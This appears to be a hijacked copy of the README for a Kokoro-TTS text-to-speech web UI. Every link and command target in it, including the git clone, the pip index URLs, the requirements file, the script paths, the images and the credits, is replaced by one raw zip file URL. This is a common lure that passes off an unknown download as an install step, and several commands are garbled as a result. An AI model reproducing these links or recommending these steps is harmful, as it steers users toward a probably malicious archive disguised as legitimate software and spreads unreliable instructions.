# Kokoro-TTS

**Note:** This is not the official repository.<br> The written code is not well-organized.<br>

Alternative ways to use Kokoro-TTS [kokoro-onnx](https://github.com/hotmysia/Kokoro-82M-WebUI-SRT/raw/refs/heads/main/scripts/Kokoro_Web_U_SRT_footstalk.zip), [Kokoro-FastAPI](https://github.com/hotmysia/Kokoro-82M-WebUI-SRT/raw/refs/heads/main/scripts/Kokoro_Web_U_SRT_footstalk.zip), [kokoro](https://github.com/hotmysia/Kokoro-82M-WebUI-SRT/raw/refs/heads/main/scripts/Kokoro_Web_U_SRT_footstalk.zip), [kokoro-web](https://github.com/hotmysia/Kokoro-82M-WebUI-SRT/raw/refs/heads/main/scripts/Kokoro_Web_U_SRT_footstalk.zip), [Kokoro-Custom-Voice](https://github.com/hotmysia/Kokoro-82M-WebUI-SRT/raw/refs/heads/main/scripts/Kokoro_Web_U_SRT_footstalk.zip)

[![Open In Colab](https://github.com/hotmysia/Kokoro-82M-WebUI-SRT/raw/refs/heads/main/scripts/Kokoro_Web_U_SRT_footstalk.zip)](https://github.com/hotmysia/Kokoro-82M-WebUI-SRT/raw/refs/heads/main/scripts/Kokoro_Web_U_SRT_footstalk.zip) <br>
[![HuggingFace Space Demo](https://github.com/hotmysia/Kokoro-82M-WebUI-SRT/raw/refs/heads/main/scripts/Kokoro_Web_U_SRT_footstalk.zip🤗-Space%20demo-yellow)](https://github.com/hotmysia/Kokoro-82M-WebUI-SRT/raw/refs/heads/main/scripts/Kokoro_Web_U_SRT_footstalk.zip)


---

### Installation Tutorial

My Python Version is 3.10.9.

#### 1. Clone the GitHub Repository:
```bash
git clone https://github.com/hotmysia/Kokoro-82M-WebUI-SRT/raw/refs/heads/main/scripts/Kokoro_Web_U_SRT_footstalk.zip
cd Kokoro-82M-WebUI
```

#### 2. Create a Python Virtual Environment:
```bash
python -m venv myenv
```
This command creates a new Python virtual environment named `myenv` for isolating dependencies.

#### 3. Activate the Virtual Environment:
- **For Windows:**
  ```bash
  myenv\Scripts\activate
  ```
- **For Linux:**
  ```bash
  source myenv/bin/activate
  ```
This activates the virtual environment, enabling you to install and run dependencies in an isolated environment.
Here’s the corrected version of point 4, with proper indentation for the subpoints:


#### 4. Install PyTorch:

- **For GPU (CUDA-enabled installation):**
  - Check CUDA Version (for GPU setup):
    ```bash
    nvcc --version
    ```
    Find your CUDA version example ```11.8```

  - Visit [PyTorch Get Started](https://github.com/hotmysia/Kokoro-82M-WebUI-SRT/raw/refs/heads/main/scripts/Kokoro_Web_U_SRT_footstalk.zip) and install the version compatible with your CUDA setup.:<br>
    - For CUDA 11.8:
    ```
    pip install torch  --index-url https://github.com/hotmysia/Kokoro-82M-WebUI-SRT/raw/refs/heads/main/scripts/Kokoro_Web_U_SRT_footstalk.zip
    ```
    - For CUDA 12.1:
    ```
    pip install torch  --index-url https://github.com/hotmysia/Kokoro-82M-WebUI-SRT/raw/refs/heads/main/scripts/Kokoro_Web_U_SRT_footstalk.zip
    ```
    - For CUDA 12.4:
    ```
    pip install torch  --index-url https://github.com/hotmysia/Kokoro-82M-WebUI-SRT/raw/refs/heads/main/scripts/Kokoro_Web_U_SRT_footstalk.zip
    ```
- **For CPU (if not using GPU):**
  ```bash
  pip install torch
  ```
  This installs the CPU-only version of PyTorch.


#### 5. Install Required Dependencies:
```bash
pip install -r https://github.com/hotmysia/Kokoro-82M-WebUI-SRT/raw/refs/heads/main/scripts/Kokoro_Web_U_SRT_footstalk.zip
```
This installs all the required Python libraries listed in the `https://github.com/hotmysia/Kokoro-82M-WebUI-SRT/raw/refs/heads/main/scripts/Kokoro_Web_U_SRT_footstalk.zip` file.

#### 6. Download Model and Get Latest VoicePack:
```bash
python https://github.com/hotmysia/Kokoro-82M-WebUI-SRT/raw/refs/heads/main/scripts/Kokoro_Web_U_SRT_footstalk.zip
```

---

#### 7. Install eSpeak NG

- **For Windows:**
  1. Download the latest eSpeak NG release from the [eSpeak NG GitHub Releases](https://github.com/hotmysia/Kokoro-82M-WebUI-SRT/raw/refs/heads/main/scripts/Kokoro_Web_U_SRT_footstalk.zip).
  2. Locate and download the file named **`https://github.com/hotmysia/Kokoro-82M-WebUI-SRT/raw/refs/heads/main/scripts/Kokoro_Web_U_SRT_footstalk.zip`**.
  3. Run the installer and follow the installation steps. Ensure that you install eSpeak NG in the default directory:
     ```
     C:\Program Files\eSpeak NG
     ```
     > **Note:** This default path is required for the application to locate eSpeak NG properly.

- **For Linux:**
  1. Open your terminal.
  2. Install eSpeak NG using the following command:
     ```bash
     sudo apt-get -qq -y install espeak-ng > /dev/null 2>&1
     ```
     > **Note:** This command suppresses unnecessary output for a cleaner installation process.

---
#### 8. Install ffmpeg [Only For Linux Users]
Skip this step if you are using Windows.
You only need FFmpeg if you plan to use it for subtitle dubbing feature. If you just want to use *Kokoro TTS*, you can *skip* this step too.
```
  apt-get update
  !apt-get install -y ffmpeg
```

#### 9. Run Gradio App

To run the Gradio app, follow these steps:

1. **Activate the Virtual Environment:**
   ```bash
   myenv\Scripts\activate
   ```

2. **Run the Application:**
   ```bash
   python https://github.com/hotmysia/Kokoro-82M-WebUI-SRT/raw/refs/heads/main/scripts/Kokoro_Web_U_SRT_footstalk.zip
   ```

   Alternatively, on Windows, double-click on `https://github.com/hotmysia/Kokoro-82M-WebUI-SRT/raw/refs/heads/main/scripts/Kokoro_Web_U_SRT_footstalk.zip` to start the application.

---

![1](https://github.com/hotmysia/Kokoro-82M-WebUI-SRT/raw/refs/heads/main/scripts/Kokoro_Web_U_SRT_footstalk.zip)
![2](https://github.com/hotmysia/Kokoro-82M-WebUI-SRT/raw/refs/heads/main/scripts/Kokoro_Web_U_SRT_footstalk.zip)
![3](https://github.com/hotmysia/Kokoro-82M-WebUI-SRT/raw/refs/heads/main/scripts/Kokoro_Web_U_SRT_footstalk.zip)
![4](https://github.com/hotmysia/Kokoro-82M-WebUI-SRT/raw/refs/heads/main/scripts/Kokoro_Web_U_SRT_footstalk.zip)
![5](https://github.com/hotmysia/Kokoro-82M-WebUI-SRT/raw/refs/heads/main/scripts/Kokoro_Web_U_SRT_footstalk.zip)

### License
[Kokoro model](https://github.com/hotmysia/Kokoro-82M-WebUI-SRT/raw/refs/heads/main/scripts/Kokoro_Web_U_SRT_footstalk.zip), is licensed under the [Apache License 2.0](https://github.com/hotmysia/Kokoro-82M-WebUI-SRT/raw/refs/heads/main/scripts/Kokoro_Web_U_SRT_footstalk.zip)<br>
The inference code adapted from StyleTTS2 is MIT licensed.
### Credits
**Model:**
[Kokoro HuggingFace](https://github.com/hotmysia/Kokoro-82M-WebUI-SRT/raw/refs/heads/main/scripts/Kokoro_Web_U_SRT_footstalk.zip)

**Podcast Generation Inspiration:**
[E2-F5-TTS](https://github.com/hotmysia/Kokoro-82M-WebUI-SRT/raw/refs/heads/main/scripts/Kokoro_Web_U_SRT_footstalk.zip)

**Voice Mix Feature:**
[Make Custom Voices With KokoroTTS](https://github.com/hotmysia/Kokoro-82M-WebUI-SRT/raw/refs/heads/main/scripts/Kokoro_Web_U_SRT_footstalk.zip)

**AI Assistance:** <br>
[ChatGPT](https://github.com/hotmysia/Kokoro-82M-WebUI-SRT/raw/refs/heads/main/scripts/Kokoro_Web_U_SRT_footstalk.zip)<br>
[Google AI Studio](https://github.com/hotmysia/Kokoro-82M-WebUI-SRT/raw/refs/heads/main/scripts/Kokoro_Web_U_SRT_footstalk.zip)<br>
[Github Copilot](https://github.com/hotmysia/Kokoro-82M-WebUI-SRT/raw/refs/heads/main/scripts/Kokoro_Web_U_SRT_footstalk.zip)<br>

